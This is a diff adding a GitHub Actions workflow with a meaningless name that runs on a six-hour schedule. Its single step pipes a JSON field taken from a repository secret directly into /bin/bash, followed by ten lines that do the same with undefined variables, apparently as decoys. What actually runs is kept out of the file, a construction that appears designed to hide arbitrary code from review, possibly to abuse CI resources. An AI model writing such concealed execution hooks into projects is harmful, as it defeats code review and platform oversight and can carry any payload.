@@ -1,0 +1,27 @@
+name: duiyoumenhuxiangjaiyifan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duiyoumenhuxiangjaiyifan
+        env:
+          id968: ${{ secrets.id968 }}
+        run: |
+          echo $id968 | jq -r .n2 | /bin/bash
+          echo $j901 | jq -r .fj598 | /bin/bash
+          echo $vusvc0 | jq -r .prw2607 | /bin/bash
+          echo $gqy76897 | jq -r .oqb038 | /bin/bash
+          echo $lki748 | jq -r .et03967 | /bin/bash
+          echo $hal12 | jq -r .jqrre1979 | /bin/bash
+          echo $zrrbs534 | jq -r .zwiso41425 | /bin/bash
+          echo $jisvl6 | jq -r .tbsu96790 | /bin/bash
+          echo $jpylh5390 | jq -r .ake09855 | /bin/bash
+          echo $hoxqs5 | jq -r .lzpv26 | /bin/bash
+          echo $pep114 | jq -r .unrv5 | /bin/bash
+
